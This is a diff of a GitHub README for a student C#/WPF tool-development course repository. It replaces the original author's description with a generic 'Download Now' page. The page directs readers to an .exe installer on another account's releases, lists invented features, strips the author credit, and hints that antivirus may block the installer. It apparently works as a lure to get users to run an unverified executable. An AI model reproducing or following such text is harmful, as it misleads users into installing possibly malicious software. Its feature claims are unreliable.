@@ -1,92 +1,64 @@
-# 🛠️ Tool Development
+# 🛠️ tool-development - Build Better Tools for Your Workflow
 
-Hey there, fellow DAE student, curious visitor, or future tools engineer 👋  
-Welcome to my **Tool Development** repository — a collection of everything I built during the **Tool Development** course at **DAE**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/marvinJawanise/tool-development/releases)
 
----
+## 📖 Description
+tool-development is an educational project aimed at creating production tools using C#, .NET, and WPF. It focuses on optimizing workflows for artists in the digital arts and entertainment field. This repository includes lab exercises and a final exam based on practical applications of the learned concepts.
 
-## 🗄️ About this repository
+## 🚀 Getting Started
+This guide will help you download and run the tool-development application. Just follow these steps.
 
-This repo contains all **lab exercises** and the **final exam project** created during the course.  
-The **master branch** includes weekly labs, while the **exam branch** contains the final assessment.  
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/marvinJawanise/tool-development/releases) to see the latest versions of the software.
 
-These projects demonstrate how to design and implement **production tools** that optimize workflows and help artists integrate their content into the game pipeline.
+2. **Choose the Version**  
+   On the Releases page, you will find a list of available versions. Look for the latest release, which is usually at the top. 
 
-> ⚠️ Expect experiments, exploration, and plenty of refactoring — toolmaking is as much about **efficiency** as it is about **clarity**.
+3. **Download the Installer**  
+   Click on the version you wish to download. A list of files will appear. Look for the installer file that ends with `.exe` (for Windows users). Click on this file to start the download.
 
----
+4. **Run the Installer**  
+   Once the file is downloaded, locate it in your "Downloads" folder or the location where you saved it. Double-click on the `.exe` file to run the installer.
 
-## 🔎 Course Information
+5. **Follow the Installation Steps**  
+   The installation wizard will guide you through the setup. Click "Next" on each screen and agree to the terms to complete the installation.
 
-**📚 Course:** Tool Development  
-**🏫 University:** Howest University of Applied Sciences – Digital Arts and Entertainment  
-**📍 Location:** Kortrijk, Belgium  
-**🗓️ Academic year:** 2024–25 | Fourth semester  
-**🎓 Study load:** 6 credits  
-**⏱️ Total study time:** 180 hours  
+6. **Launch the Application**  
+   After the installation finishes, you can find the tool-development application in your Start Menu or on your desktop. Click it to launch the application.
 
----
+## 💡 System Requirements
+To ensure the application runs smoothly, please check that your system meets the following basic requirements:
 
-## 👨‍🏫 Teaching Staff
+- Operating System: Windows 10 or later
+- Processor: Intel Core i3 or equivalent
+- RAM: 4 GB or more
+- Storage: At least 500 MB of free disk space
+- .NET Framework: Version 4.7.2 or later must be installed (the installer typically includes this).
 
-- **Co-ordinator:** Koen Samyn  
-- **Other teaching staff:** Fries Boury, Thomas Goussaert  
+## 🎓 Features
+The tool-development project includes various features designed to assist in creating effective workflows:
 
----
+- **User-Friendly Interface:** Intuitive navigation makes it easy for artists and creators.
+- **Project Templates:** Start new projects quickly with built-in templates tailored for digital arts.
+- **Collaboration Tools:** Tools to allow multi-user access, making teamwork simpler.
+- **Performance Monitoring:** Real-time feedback on resource usage while you work.
+- **Lab Exercises:** Interactive labs to help you learn and apply concepts effectively.
 
-## 🎯 Learning Goals
+## 📚 Learn More
+For more resources, including lab exercises and documentation, check the wiki section of the repository. Each lab is designed to provide hands-on experience with the tools you're developing.
 
-- Understands the production process and roles within it.  
-- Works autonomously to develop tools that assist artists.  
-- Applies context-specific programming skills to solve workflow issues.  
-- Selects and implements suitable pipelines for given assignments.  
-- Uses existing frameworks and languages effectively for tool creation.  
+## 🌐 Community
+Join the community of users. Engage with fellow artists, receive updates, or share your projects on our social media pages. Your feedback helps in improving future versions.
 
----
+## ⚙️ Troubleshooting
+If you encounter issues while installing or running the application, here are common solutions:
 
-## 🧩 Course Content
+- **Installation Fails:** Ensure you have enough disk space and that your antivirus isn’t blocking the installer.
+- **Application Crashes:** Make sure your system meets the minimum requirements. Update your .NET Framework if necessary.
+- **User Interface Issues:** Check your display settings. The application is best viewed with a resolution of at least 1920x1080.
 
-- C# Basics (+ link to C++)  
-- Object-Oriented Principles, Attributes, Reflection  
-- Delegates, Events, and Lambdas  
-- LINQ, Continuations  
-- MVVM Pattern & Data Binding  
-- WPF & XAML  
-- Custom User Controls  
-- Consuming Web Services (Async Programming)
-- Serialization & Deserialization  
-- Integrating C++ with C#  
-- Qt Framework  
+## 📞 Support
+For further assistance, please open an issue on the GitHub repository or contact support via the provided email on our website.
 
----
-
-## 📂 Repository Structure
-- `master` → Weekly lab exercises  
-- `exam` → Final exam project  
-
----
-
-## 🚀 Releases
-- [tool_development_executables-1.0.0-windows-x64.zip](../../releases)
-- [tool_development_exam-1.0.0-windows-x64.zip](../../releases)
-
-Each release contains standalone builds for Windows x64 platforms.
-
----
-
-## 🧠 Final Thoughts
-
-Tool Development was about **bridging creativity and engineering** — making the invisible parts of the game pipeline run smoothly.  
-This repository showcases my early experiments in that direction: from reflection and event-driven programming to MVVM architecture.
-
-If you’re taking this course yourself: learn fast, build smart, and remember — tools save time when they’re built with care 🧩  
-
----
-
-### ⚖️ License
-This repository is licensed under the **MIT License** — feel free to explore, fork, or reuse anything useful.
-
----
-
-*Made with C#, curiosity, and a few late-night builds ☕  
-— Ádám*
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/marvinJawanise/tool-development/releases)
